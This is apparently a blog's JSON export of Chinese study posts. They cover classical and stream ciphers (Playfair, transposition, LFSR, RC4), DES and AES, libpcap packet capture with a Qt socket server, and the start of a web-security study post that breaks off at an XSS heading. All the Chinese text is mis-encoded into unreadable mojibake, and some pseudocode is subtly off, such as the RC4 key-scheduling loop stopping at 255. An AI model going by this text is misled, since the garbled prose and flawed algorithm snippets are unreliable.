å¯†å…³ç³»ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454253.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454189.png)\n\nè¿™é‡Œçš„åˆå§‹åŒ–çŠ¶æ€å’Œè½¬åŠ¨æ–¹å¼å°±å¯çœ‹ä½œæ˜¯å¯†é’¥ã€‚\n\n \n\n4.Polygraphic Cipherï¼šå¤šå›¾æ›¿ä»£å¯†ç \n\n(1)Play fairå¯†ç ï¼šåŒå­—æ¯éŸ³èŠ‚æ›¿ä»£åŠ å¯†\n\nâ‘ keyï¼šéšæ„é€‰å–å¯†é’¥key\n\nâ‘¡å¡«è¡¨ï¼škeyé¡ºåºåŠ ä¸Šå‰©ä½™å­—æ¯ä¾æ¬¡æ’åˆ—è¿›5Ã—5è¡¨ä¸­(è¿™é‡Œkeyä¸ºharpsichord)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454715.png)\n\nâ‘¢åˆ†ç»„ï¼šå¯¹æ˜æ–‡è¿›è¡ŒæŒ‰ä¸¤ä¸ªå­—æ¯ä¸€å¯¹è¿›è¡Œåˆ†ç»„ï¼Œå¦‚æœå…¶ä¸­æœ‰å­—æ¯å¯¹ä¸¤ä¸ªå­—æ¯ç›¸åŒï¼Œå°±åœ¨å…¶ä¸­å¡«å……ä¸€ä¸ªå…¶ä»–å­—æ¯(è¿™ä¸ªå­—æ¯æœ€å¥½é€‰å–å‡ºç°æ¦‚ç‡è¾ƒå°çš„å­—æ¯ï¼Œæ¯”å¦‚xxåŸºæœ¬ä¸ä¼šå‡ºç°)ï¼šballon -> ba lx lo on\n\nâ‘£åŠ å¯†ï¼š\n\nA.è½åœ¨çŸ©é˜µåŒä¸€è¡Œçš„æ˜æ–‡å­—æ¯å¯¹ä¸­å­—æ¯ç”±å…¶å³è¾¹å­—æ¯ä»£æ›¿ï¼Œæœ€å³è¾¹åˆ™ç”±æœ€å·¦è¾¹æ›¿ä»£ã€‚ä¾‹å¦‚ï¼šAR->RP\n\nB.è½åœ¨çŸ©é˜µåŒä¸€åˆ—çš„æ˜æ–‡å­—æ¯å¯¹ä¸­å­—æ¯ç”±å…¶ä¸‹è¾¹å­—æ¯ä»£æ›¿ï¼Œæœ€ä¸‹é¢åˆ™ç”±æœ€ä¸Šé¢æ›¿ä»£ã€‚ä¾‹å¦‚ï¼šIM->EV\n\nC.ä¸åŒè¡Œä¸åŒåˆ—çš„åˆ™ç”±å¯¹ç§°è¡Œåˆ—è½¬åŒ–åŠ å¯†(åŒè¡Œæ›¿æ¢)ï¼Œä¾‹å¦‚ï¼šCT->DNï¼ŒOU->BQ....\n\nâ˜†åˆ†æï¼š(m1,m2)->(c1,c2)ï¼Œé‚£ä¹ˆå¦‚æœæœ‰(m2,m1)ï¼Œåˆ™ä¸€å®šæ˜¯(m1,m2)->(c2,c1)ã€‚å¯ä»¥å°†æ˜æ–‡å’Œå¯†æ–‡å¯¹æ¯”ç§»ä½ã€‚(å…·ä½“çš„çœ‹PDF)\n\n \n\n(2)Double playfairå¯†ç ï¼š\n\nâ‘ é€‰å–ä¸¤ä¸ªå…³é”®è¯keyï¼Œå»é‡ï¼Œå¡«è¡¨æ„å»ºä¸¤ä¸ªçŸ©é˜µï¼Œè¡Œå¯¹åº”æ’åˆ—ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455819.png)\n\nâ‘¡ç»™å®šä¸€ä¸ªæ•°å­—ï¼Œæ‰€æœ‰æ˜æ–‡æŒ‰ç…§æ‰€é€‰æ•°å­—åˆ†ç»„è¿›è¡Œæ’åˆ—ï¼Œä¸è¶³çš„è¡¥æŒ‡å®šå­—æ¯ã€‚ä¾‹å¦‚ç»™å®šæ˜æ–‡ä¸ºthis is double playfair cipherï¼Œæ•°å­—ä¸º10ï¼Œä¸è¶³è¡¥xï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nthisisdoub\nleplayfair\n\ncipherxxxx\nxxxxxxxxxx\n```\n\nâ‘¢æŒ‰ç»„è¿›è¡ŒåŠ å¯†ï¼Œä¸Šè¿°åˆ†ç»„æƒ…å†µå³ä¸ºtl,he,ip.....cx,ix,px.......xxå…±è®¡20ç»„ã€‚\n\nâ‘£å¯¹æ¯ç»„è¿›è¡ŒåŠ å¯†ï¼Œåˆ†åˆ«ä»ä¸¤ä¸ªçŸ©é˜µä¸­æ‰¾åˆ°æ˜æ–‡å­—æ¯å¯¹ï¼ŒåŠ å¯†è§„åˆ™ç±»ä¼¼ï¼š\n\nA.ä¸åŒè¡Œçš„å³å¯¹è§’çº¿äº¤æ¢ï¼štl->op\n\nB.åŒè¡Œçš„ç”±å³è¾¹å­—æ¯æ›¿ä»£ï¼Œä½†è¿™é‡Œæ›¿ä»£å®Œä¹‹åè¿˜éœ€è¦äº¤æ¢ä¸€ä¸‹ï¼šbr->ac\n\n \n\n5.Transposition cipherï¼š\n\n(1)Skytale cipherï¼šç¼ ç»•å¯†ç ï¼Œä¸€å¼ å›¾è¯´æ˜ä¸€åˆ‡\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454647.png)\n\n(2)Permutation cipherï¼š\n\nâ‘ ç»™å®šå¯†é’¥ï¼ŒæŒ‰å­—æ¯è¡¨æ’åˆ—é¡ºåºã€‚ä¾‹å¦‚keyï¼Œé¡ºåºä¸º(2 1 3)ã€‚\n\nâ‘¡ä¾æ®å¯†é’¥é•¿åº¦åˆ†ç»„æ˜æ–‡ï¼Œä¸è¶³è¡¥æŒ‡å®šå­—ç¬¦ã€‚ä¾‹å¦‚Permutation cipherï¼Œåˆ†ä¸ºPer mut ati onc iph erx(æœ€åè¡¥äº†x)\n\nâ‘¢æ ¹æ®å¯†é’¥é¡ºåºç½®æ¢ï¼Œ(2 1 3)å³ä»£è¡¨ç¬¬äºŒä¸ªå­—æ¯æ”¾åˆ°ç¬¬ä¸€ä¸ªï¼Œç¬¬ä¸€ä¸ªå­—æ¯æ”¾åˆ°ç¬¬äºŒä¸ªï¼Œç¬¬ä¸‰ä¸ªå­—æ¯æ”¾åˆ°ç¬¬ä¸‰ä¸ªã€‚å¯å¾—ePr umt tai noc pih rexå³ä¸ºæ‰€æ±‚å¯†æ–‡ã€‚\n\n(3)Column Permutation cipherï¼š\n\nâ‘ ç»™å®šå¯†é’¥ï¼ŒæŒ‰å­—æ¯è¡¨æ’åˆ—é¡ºåºã€‚ä¾‹å¦‚keyï¼Œé¡ºåºä¸º(2 1 3)ã€‚\n\nâ‘¡ä¾æ®å¯†é’¥é•¿åº¦åˆ†ç»„æ˜æ–‡ï¼Œç«–å‘æ’åˆ—ã€‚ä¾‹å¦‚Permutation cipherï¼Œåˆ†ä¸º\n\n```\n#æ³¨é‡Šå¤´\n\n213\nPer \nmut \nati \nonc \niph \ner\n```\n\nâ‘¢ä¾æ®é¡ºåºå°†åˆ—ç«–å‘æå–ï¼Œæ¨ªå‘ç”Ÿæˆå¯†æ–‡ï¼šeutnpr Pmaonie rtichå³ä¸ºæ‰€æ±‚å¯†æ–‡ã€‚\n\n(4)Double Permutation cipherï¼šä¸€æ ·ï¼Œåªæ˜¯é‡å¤ä¸¤æ¬¡\n\n \n\n&ç¬¬ä¸‰ç«  æµå¯†ç  Stream Cipher ç”Ÿæˆ\n\n1.LFSRï¼šç»™å®šåˆå§‹å€¼ï¼ŒæŒ‡å®šåé¦ˆä½å¼‚æˆ–ç”Ÿæˆä»å·¦è¾¹è¿›å…¥ï¼Œä»å³è¾¹å‡ºæ¥ç”Ÿæˆç”Ÿæˆå¯†é’¥æµï¼Œè¿™é‡Œå°±ä¼šæ˜¯101011 00....\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455530.png)\n\nâ˜†é’ˆå¯¹LFSRæ”»å‡»ï¼šå°†å¯†æ–‡é€ä¸¤ä¸ªå¼‚æˆ–å¾—åˆ°åˆ†ææ®µï¼Œå¦‚å›¾ç¬¬ä¸€æ®µä¸ºå¯†æ–‡æ®µï¼Œç¬¬äºŒæ®µä¸ºåˆ†ææ®µï¼Œå…¶ä¸­é‡å¤éƒ¨åˆ†ç›¸è·çš„é•¿åº¦å³ä¸ºLFSRçš„ä¸¤ä¸ªçº¿æ€§åé¦ˆä½çš„é•¿åº¦ï¼Œè¿™é‡Œæ˜¯4ï¼Œå¦‚ä¸Šå›¾çš„LFSRï¼Œä¹‹åå†åˆ†æç ´è§£ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454156.png)\n\n2.RC4ï¼š\n\n(1)åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„S[]ï¼Œä¸€èˆ¬ä¸º0-255ï¼Œè¿™é‡Œå‡è®¾ä¸º0-7ï¼ŒS[]:[0,1,2,3,4,5,6,7]ã€‚ä¹‹ååˆå§‹åŒ–ä¸€ä¸ªkeyé¡ºåºæ•°ç»„K[]ç»™å®šåˆå§‹å¯†é’¥é¡ºåºï¼Œå‡è®¾ä¸º567ï¼Œé‡å¤è‡³8ä½K[]:[5,6,7,5,6,7,5,6]ã€‚\n\n(2)é€šè¿‡KSAç®—æ³•ä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nj = 0 \nfor i in range(0,255):\n    j = (j + S[i] + K[i])mod 256 \n    tmp = S[i]\n    S[i] = S[j]\n    S[j] = tmp\n```\n\nä¸Šè¿°ä¾‹å­å¾—åˆ°æ–°çš„S[]:[5,4,0,7,1,6,3,2]\n\n(3)é€šè¿‡PRGAç®—æ³•ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ni = 0\nj = 0\ni = (i + 1)mod 256\nj = (j + S[i]) mod 256\n\ntmp = S[i] \nS[i] = S[j] \nS[j] = tmp\n\nt = (S[j] + S[i])mod 256\nk = S[t]\n```\n\nä¸Šè¿°ä¾‹å­å¾—åˆ°K = 6ï¼Œä¹‹åé‡å¤8æ¬¡(n)ï¼Œå³å¯å¾—åˆ°æœ€ç»ˆå¯†é’¥K\n\n \n\n3.CAï¼šcellular automataç»†èƒè‡ªåŠ¨æœº\n\n(1)1Dï¼Œå³ä¸€ç»´çš„ï¼š\n\nâ‘ ç»™å®šåˆå§‹çŠ¶æ€(ä¸€èˆ¬éšæœºç”Ÿæˆ)ï¼Œè¿™é‡Œé€‰ä¸º0010100(å¤šå°‘bitéƒ½è¡Œ)ã€‚\n\nâ‘¡ç»™å®šçŠ¶æ€è½¬æ¢è§„åˆ™ï¼Œä¸€èˆ¬ç»™ä¸€ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œç„¶åè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œè¿™é‡Œé€‰ä¸º23ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n000 001 010 011 100 101 110 111\n 0   0   0   1   0   1   1   1   = 23\n```\n\nâ‘¢ä¾æ®è§„åˆ™æ¼”å˜è‡³ä¸‹ä¸€ä¸ªçŠ¶æ€(ä¾æ®å½“å‰ä½å’Œå·¦å³é‚»ä½)ï¼Œé‚£ä¹ˆåˆå§‹çŠ¶æ€å°±å¯ä»¥å¯¹åº”ä»¥ä¸‹ä¸ƒç§çŠ¶æ€ï¼š\n\n000 001 010 101 010 100 000\n\nä¾æ®è§„åˆ™è½¬åŒ–ä¸º 0001000ï¼Œå³ä¸ºåˆå§‹çŠ¶æ€çš„ä¹‹åçš„ç¬¬ä¸€ä¸ªçŠ¶æ€ã€‚ä¾æ®æ­¤è§„åˆ™å¯æ¼”å˜å‡ºå¤šç§çŠ¶æ€ã€‚\n\nâ‘£å†è®¾å®šè§„åˆ™ï¼Œä»æ¯ä¸ªçŠ¶æ€ä¸­å–ç¬¬xä½ä½œä¸ºå¯†é’¥ï¼Œé‚£ä¹ˆnä¸ªçŠ¶æ€å°±ä¼šå¯¹åº”ç”Ÿæˆnä½çš„keyã€‚\n\n(2)2Dï¼Œå³äºŒç»´çš„ï¼šåŸç†ç±»ä¼¼ï¼Œç»™å®šåˆå§‹çŠ¶æ€ä¸è§„åˆ™ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454153.png)\n\nè¿™é‡Œçš„Von Neumann Neighborhoodå’ŒMoore Neighborhoodå¯¹åº”ä¸¤ç§ä¸åŒçš„é‚»å±…é€‰æ‹©è§„åˆ™ã€‚\n\nâ–²è§„åˆ™ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455128.png)\n\nè¿™é‡Œçš„Xä¸ºè‡ªå®šä¹‰çš„ä¸€ä¸ªåˆå§‹å€¼0æˆ–1ï¼Œä¹‹åçš„CNSWEåˆ†åˆ«å¯¹åº”è‹±æ–‡certerï¼Œnorthï¼Œsouthï¼Œwestï¼Œeastï¼Œå³ä¸­ä¸Šä¸‹å·¦å³ï¼ŒåŠ ä¸Šæ˜¯ä¸€ä¸ªç»™å®šçš„è§„åˆ™ï¼Œä¾‹å¦‚é€‰å®šï¼š(XCNSWE)ä¸º(001110)=14ï¼Œé‚£ä¹ˆ14å³ä¸ºç»™å®šçš„è§„åˆ™ã€‚\n\nSi,j(t)å³ä¸ºå½“å‰çŠ¶æ€åˆ†åˆ«å¯¹åº”çš„0æˆ–1çš„å€¼ï¼Œä¾æ®ä¸Šè¿°ç­‰å¼ç®—å‡ºä¸‹ä¸€çŠ¶æ€çš„å€¼å³å¯ã€‚(è¿™é‡Œæ˜¯Von Neumann Neighborhood)\n\nâ˜†é’ˆå¯¹æµå¯†ç æ”»å‡»ï¼šæ’å…¥æ˜æ–‡æ”»å‡»ï¼Œå‡è®¾æ”»å‡»è€…å¯ä»¥æ’å…¥1bitçš„æŒ‡å®šæ˜æ–‡ï¼Œå†æ¬¡è¿›è¡Œå‘é€ï¼Œç„¶åä¹Ÿå¯ä»¥æˆªè·åˆ°å¯†æ–‡ï¼Œé‚£ä¹ˆå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454656.png)  ç¬¬ä¸€æ¬¡(åªçŸ¥é“å¯†æ–‡Ci)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455603.png)ç¬¬äºŒæ¬¡æ’å…¥på(çŸ¥é“å¯†æ–‡Ciå’Œpã€c)\n\nç°åœ¨å¯ä»¥é€šè¿‡p^cç®—å‡ºk2ï¼Œå¸¦å…¥ç¬¬ä¸€å¼ å›¾ï¼Œc2^k2ç®—å‡ºp2ï¼Œå†å¸¦å…¥ç¬¬äºŒå¼ å›¾p2^c3ç®—å‡ºk3ï¼Œä¾æ¬¡ç±»æ¨å¯å¾—åˆ°å…¨éƒ¨ï¼Œé™¤äº†p1,k1,c1ã€‚\n\n \n\n \n\n&ç¬¬å››ç«  åˆ†ç»„å¯†ç \n\n1.DESåŠ å¯†(Data Encryption Standard)ï¼š\n\n(1)å¯†é’¥ç”Ÿæˆï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454854.png)\n\nâ‘ 64ä½å¯†é’¥ï¼Œå…¶ä¸­8ä½ä¸ºå¥‡å¶æ ¡éªŒä½ï¼Œç”Ÿæˆå­å¯†é’¥è¿‡ç¨‹ä¸­éœ€è¦å‰”é™¤ï¼Œç»è¿‡PC-1å‹ç¼©å¾—åˆ°k(56bit)\nâ‘¡å°†kåˆ†ä¸ºKL0å’ŒKR0ï¼Œå„28bit\nâ‘¢KL0å’ŒKR0å·¦ç§»xä½å¾—åˆ°KL0x,KR0x\nâ‘£å°†KL0xå’ŒKR0xåˆå¹¶ï¼Œé€šè¿‡PC-2ç½®æ¢å¾—åˆ°å­å¯†é’¥K0(48bit)\nâ‘¤å°†KL0xå’ŒKR0xæ‹·è´ä¸€ä»½å¾—åˆ°ä¸‹ä¸€è½®çš„KL1å’ŒKR1\n\né‡å¤3-5æ­¥16è½®ï¼Œå…±å¾—åˆ°k0-k15ä¸ªå­å¯†é’¥ä»¥ä¾›åŠ å¯†\n\n(2)åŠ å¯†æµç¨‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454057.png)\n\nâ‘ ä»¥8ä¸ªå­—æ¯ä¸ºä¸€ä¸ªå•ä½å–æ˜æ–‡\nâ‘¡å°†ä¸€å•ä½æ˜æ–‡é€šè¿‡ITæ‰“ä¹±å¾—åˆ°Y0\nâ‘¢å–Y0å·¦è¾¹32ä½ä¸ºPL0,å³è¾¹32ä½ä¸ºPR0\nâ‘£å°†PR0å¤åˆ¶ä¸€ä»½ä¸ºL1-------ç”¨ä½œä¸‹ä¸€è½®çš„L\nâ‘¤å°†PR0ç”¨EBOXæ‰©å±•ç½®æ¢å¾—åˆ°EPR0(48bit)\nâ‘¥å°†EPR0ä¸K0å¼‚æˆ–å¾—åˆ°K_X_P(48bit)\nâ‘¦å°†K_X_Pç”¨SBOXå‹ç¼©å¾—åˆ°SPR0(32bit)\nâ‘§å°†SR0ä¸PBOXè¿›è¡Œç½®æ¢å¾—åˆ°PPR0\nâ‘¨å°†PPR0ä¸L0å¼‚æˆ–å¾—åˆ°ä¸‹ä¸€è½®çš„PR1\n\né‡å¤4-9æ­¥16è½®(å…¶ä¸­fè½®å‡½æ•°å³ä¸ºEBOXã€Keyå¼‚æˆ–ã€SBOXã€PBOX)\n\nâ–²å¾—åˆ°PR15å’ŒL15ï¼Œå·¦å³äº¤æ¢ååˆå¹¶åœ¨ä¸€èµ·åå†ç»è¿‡IPé€†è¿ç®—æœ€ç»ˆç½®æ¢å¾—åˆ°å¯†æ–‡\n\n(3)BOXäº‹é¡¹ï¼š\n\nâ‘ EBOXï¼šè™½è¯´æ˜¯æ‰©å±•ï¼Œä½†ç›´æ¥ä¾æ®é¡ºåºæ‰©å±•å³å¯ã€‚å‰bit->åbitï¼Œåbit->å‰bitã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454861.png)\n\nâ‘¡SBOXï¼š8ä¸ªå­BOXï¼Œæ¯ä¸ªå­BOXä¸º4Ã—16çŸ©é˜µï¼Œæ¯è¡Œ0-15ä»¥æŸä¸ªå›ºå®šé¡ºåºæ’åˆ—ï¼Œé€šè¿‡æ—¶48bitåˆ†ä¸º8ä¸ªå—ï¼Œæ¯ä¸ªå—6bitã€‚é¦–å°¾bitæ‹¼åˆä¸ºrowï¼Œä¸­é—´4bitæ‹¼åˆä¸ºcolumnï¼Œä¾æ®(row,column)æ¥åœ¨æ¯ä¸ªå­BOXä¸­æ‰¾åˆ°å¯¹åº”çš„æ•°å­—åè½¬æ¢ä¸ºäºŒè¿›åˆ¶å³ä¸º4bitè¾“å‡ºã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454267.png)\n\nä¹‹åIP,IPé€†,PBOXéƒ½æ˜¯æ­£å¸¸çš„ç½®æ¢BOXã€‚\n\nâ–²è§£å¯†æµç¨‹å®Œå…¨ç›¸åŒï¼Œåªæœ‰å¯†é’¥ä½¿ç”¨é¡ºåºç›¸åã€‚\n\n \n\n2.SDESåŠ å¯†ï¼šSimpleï¼Œç±»ä¼¼ï¼Œä¸è¿‡åªæœ‰ä¸¤è½®ï¼Œä½æ•°ä¹Ÿä¸å¤ªä¸€æ ·ï¼Œåˆ†åˆ«å¾ªç¯å·¦ç§»1bitå’Œ2bitã€‚å„ç§å­BOXä¹Ÿä¼šå¯¹åº”ä¿®æ”¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454258.png)\n\n \n\n3.AESåŠ å¯†(Advanced Encryption Standard):\n\nâ–²æœ‰128bitï¼Œ192bitå’Œ...å¿˜äº†...ä»¥ä¸‹ä»¥128bitä¸ºä¾‹å­\n\n(1)å¯†é’¥ç”Ÿæˆï¼š\n\nâ‘ 128bitåˆ†ä¸º16å­—èŠ‚ç«–å‘æ’åˆ—ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nW0 W1 W2  W3 ..........\n-------------------------------------------------------\nK0 K4 K8  K12\nK1 K5 K9  K13\nK2 K6 K10 K14\nK3 K7 K11 K15\n```\n\nâ‘¡ä¾æ®è§„åˆ™è®¡ç®—W[4]è‡³W[43]ï¼š\n\nW[i] = W[i-4] xor W[i-1]     iä¸ä¸º4çš„å€æ•°æ—¶\n\nW[i] = W[i-4] xor T(W[i-1])  iä¸º4çš„å€æ•°æ—¶\n\nâ–²è®¡ç®—T(W[i-1]):\n\nA.å°†W[i-1]ä¸­å­—èŠ‚å…ƒç´ æ¨ªå‘æ’åˆ—ï¼Œå¾ªç¯å·¦ç§»1ä¸ªå­—èŠ‚ã€‚\n\nB.å°†å¾ªç¯å·¦ç§»åçš„å››ä¸ªå­—èŠ‚é€šè¿‡SBOXï¼Œå¾—åˆ°[S0,S1,S2,S3]å››ä¸ªå­—èŠ‚åˆ—è¡¨ã€‚(è¿™ä¸ªSBOXä¸º16Ã—16çŸ©é˜µï¼Œéœ€è¦å°†æ¯ä¸ªå­—èŠ‚çš„å‰4bitä½œä¸ºrowï¼Œå4bitä½œä¸ºcolumnï¼Œ(row,column)æ¥åœ¨SBOXä¸­å¯»æ‰¾å¯¹åº”å­—èŠ‚æ›¿æ¢)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454567.png)\n\nC.è®¡ç®—å¸¸é‡ï¼šr[i] = 2^((i-4)/4)\n\nD.æœ€ç»ˆT(W[i-1]) = [S0 xor r(i),S1,S2,S3]\n\nå³å¯æ±‚å¾—W[0]-W[43]å…±è®¡44ä¸ªW[i]å¯†é’¥ã€‚\n\n(2)åŠ å¯†æµç¨‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png)\n\n128bitè¾“å…¥ï¼Œå¾ªç¯9è½®ï¼Œç¬¬10è½®ä¸­æ²¡æœ‰MixColumnã€‚\n\n(3)BOXæ³¨æ„ï¼š\n\nâ‘ KeyAddï¼šæ­£å¸¸çš„128bitå¯†é’¥å’Œ128bitæ˜æ–‡å—å¼‚æˆ–ã€‚\n\nâ‘¡Substitutionï¼šå³SBOXï¼Œä¸º\n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["å­¦ä¹ "],"categories":["å­¦ä¹ "]},{"title":"æš‘æœŸæ€»ç»“","url":"/2021/08/14/æš‘æœŸæ€»ç»“/","content":"\nå°å­¦æœŸä¸€ç›´åœ¨å¿™å°ç¨‹åºçš„è®¾è®¡ï¼Œç°åœ¨æ”¾ä¸Šæ¥å§ï¼Œä¹Ÿæœ€ååšä¸ªæ€»ç»“ï¼š\n\nä¸€ã€Libcapçš„ä½¿ç”¨ï¼š\n\n1.å¤´æ–‡ä»¶ç¯å¢ƒç›¸å…³ï¼š\n\nç”¨çš„æ˜¯ubuntu18.04çš„ç¯å¢ƒ\n\n(1)å¤´æ–‡ä»¶åŠç¯å¢ƒé…ç½®ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\n\n#include <pcap.h>\n\n//cmd Programmer need\n-lpcap\n\n//QT pro need\nLIBS += -L/usr/local/lib -lpcap\n```\n\nåŒæ—¶éœ€è¦rootæƒé™ï¼ŒQTå¯ä»¥è®¾ç½®\n\n(2)QThreadä½¿ç”¨\n\n```c\n//æ³¨é‡Šå¤´\n\nclass libcapThread : public QThread\n{\n    Q_OBJECT\npublic:\n    //overwrite\n    void run();\n\n\nsignals:\n    void signalpcap(QString,QString,QString,\n        QString,QString,const u_char*);\n};\n//æ³¨é‡Šå¤´\n\nthreadObj->start();\nthreadObj->terminate();\n```\n\n2.æŠ“åŒ…æµç¨‹ï¼š\n\n(1)æœç´¢ç½‘å¡devï¼š\n\ndev = pcap_lookupdev(errbuf);\n\nè¿™ä¸ªåªèƒ½æœç´¢åˆ°ç¬¬ä¸€ä¸ªå¯ç”¨ç½‘å¡ï¼Œæœ‰çš„è£…äº†dockerå•¥çš„ä¼šå­˜åœ¨å¤šä¸ªç½‘å¡ï¼Œéœ€è¦ç”¨å…¶ä»–å‡½æ•°ã€‚\n\n(2)ç¼–è¯‘æŠ“å–è§„åˆ™ï¼š\n\npcap_compile(devHandle, &filter, \"tcp\", 0, deviceMask);\n\n(3)è®¾ç½®æŠ“å–è§„åˆ™ï¼š\n\npcap_setfilter(devHandle, &filter);\n\n(4)æŠ“åŒ…ï¼š\n\npcap_loop(devHandle, 1, baseAnalyze, NULL);\n\nâ–²å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œç„¶åè¿™é‡Œä¸€èˆ¬éœ€è¦ç”¨åˆ°å›è°ƒå‡½æ•°baseAnalyze()æ¥å¤„ç†åŒ…æ•°æ®ï¼Œå›è°ƒå‡½æ•°å¯è‡ªè¡Œå¾—åˆ°çš„å‚æ•°å¦‚ä¸‹ï¼š\n\nvoid baseAnalyze(u_char* user, const struct pcap_pkthdr* pHeader, const u_char* pPktdata)\n\n3.ç„¶åå°±æ˜¯æ­£å¸¸å¤„ç†æ˜¾ç¤ºäº†ï¼Œç›´æ¥è´´ç¨‹åº:\n\nhttps://github.com/PIG-007/Programmer/tree/master/Libcap\n\n \n\näºŒã€åŠ è§£å¯†åŒæœºçš„ä½¿ç”¨ï¼š\n\nâ–²åšäº†åŒæœºçš„æœåŠ¡å™¨ç«¯å’ŒDESï¼ŒAESï¼Œè¿˜æœ‰å‡ ä¸ªå¤å…¸ï¼Œå…¶ä»–çš„æ˜¯åŒå­¦åšçš„ï¼Œç‰¹æ­¤è¯´æ˜ä¸€ä¸‹ã€‚\n\n1.Socket\n\n(1)åˆ›å»ºå¯¹è±¡ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nserver = new QTcpServer(this);\n```\n\n(2)å¼€å§‹ç›‘å¬ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nconnect(ui->btnListen,&QPushButton::clicked,[this]{\n    //if Listening,close it\n    if(server->isListening()){\n    //server->close();\n    closeServer();//Define function\n    //Recover the status after closed\n    }else{\n        const QString address_text=ui->editAddress->text();\n        const QHostAddress address=(address_text==\"Any\")\n            ?QHostAddress::Any\n            :QHostAddress(address_text);\n        const unsigned short port=ui->editPort->text().toUShort();\n        if(server->listen(address,port)){\n        //handle function\n        }else{\n            //error function\n        }\n    }\n}\n```\n\n(3)æ£€æµ‹åˆ°è¿æ¥ï¼Œå¼€å§‹å¤„ç†ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nconnect(server,&QTcpServer::newConnection,this,[this]{\nwhile(server->hasPendingConnections())\n{\n    //nextPendingConnection get the next obj\n    QTcpSocket *socket=server->nextPendingConnection();\n    clientList.append(socket);\n    ui->textRecv->append(QString(\"(%1:%2) Soket Connected\")\n        .arg(socket->peerAddress().toString())\n        .arg(socket->peerPort()));\n        ui->textRecv->append(recv_text);\n});\n```\n\n(4)é”™è¯¯ä¿¡æ¯å¤„ç†ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\nconnect(socket, static_cast<void(QAbstractSocket::*)(QAbstractSocket::SocketError)>(&QAbstractSocket::error),\n[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n//æ³¨é‡Šå¤´\n\nconnect(socket,&QAbstractSocket::errorOccurred,[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n```\n\n2.ç•Œé¢è®¾è®¡çš„ä¸åŒstyle:\n\n```c\n//æ³¨é‡Šå¤´\n\nqApp->setStyle(QStyleFactory::create(\"fusion\"));\n```\n\n3.åŠ å¯†æ¨¡å—ï¼š\n\nå¾ˆå¤šå†…å®¹å°±æ”¾githubä¸Šï¼Œä¸å†èµ˜è¿°\n\nhttps://github.com/PIG-007/Programmer/tree/master/SocketEncrypt\n\n \n\n","tags":["å­¦ä¹ "],"categories":["å­¦ä¹ "]},{"title":"æŠ¤ç½‘Webå­¦ä¹ ","url":"/2021/08/14/æŠ¤ç½‘Webå­¦ä¹ /","content":"\nå·æºœæ¥äº†æŠ¤ç½‘ï¼Œå¸Œæœ›ä¸ä¼šè¢«é€®ä½.....\n\nâ–²å…¶å®å†³å®šæ¥ä¹‹å‰å‹æ ¹å°±ä¸ä¼šWebï¼Œè¿HTMLï¼ŒCSSï¼ŒPHPç­‰ç­‰æœ€åŸºç¡€çš„ä¸œè¥¿éƒ½ä¸äº†è§£ã€‚å†³å®šè¦æ¥ä¹‹åï¼Œå°±æŠ½ç©ºå­¦äº†ä¸€äº›ç®€å•çš„å®é™…æ¸—é€æ–¹é¢çš„Webåˆ©ç”¨ï¼Œåƒä¹‹å‰å†™çš„æ°¸æ’ä¹‹è“ï¼Œsqlmapï¼Œnmapï¼ŒBurpsuiteï¼ŒARPå•¥çš„éƒ½æ˜¯é‚£ä¸€å°æ®µæ—¶é—´ç–¯ç‹‚è¡¥çš„ä¸œè¥¿ã€‚ç„¶åæœŸé—´ç»å†äº†ä¸€ç‚¹å°æ’æ›²ï¼Œæœ¬æ¥ä»¥ä¸ºä¸ä¼šæ¥äº†ï¼Œé˜´å·®é˜³é”™åˆè¿‡æ¥äº†ã€‚å’Œæˆ‘ä¸€ä½å­¦Webå¼€å‘çš„å‚»å˜šä¸€èµ·æ¥çš„\n\nä¸€ã€HTMLã€CSSã€PHPåŸºç¡€ï¼š\n\nhttps://www.w3school.com.cn/\n\nä¸œè¥¿å¤ªæ‚ï¼Œé€‚å½“äº†è§£åŸç†ï¼Œä»¥åå³ç”¨å³å­¦ã€‚\n\n \n\näºŒã€XSSæ”»å‡»ï¼šè·¨ç«™è„šæœ¬ï¼ˆCross-Site 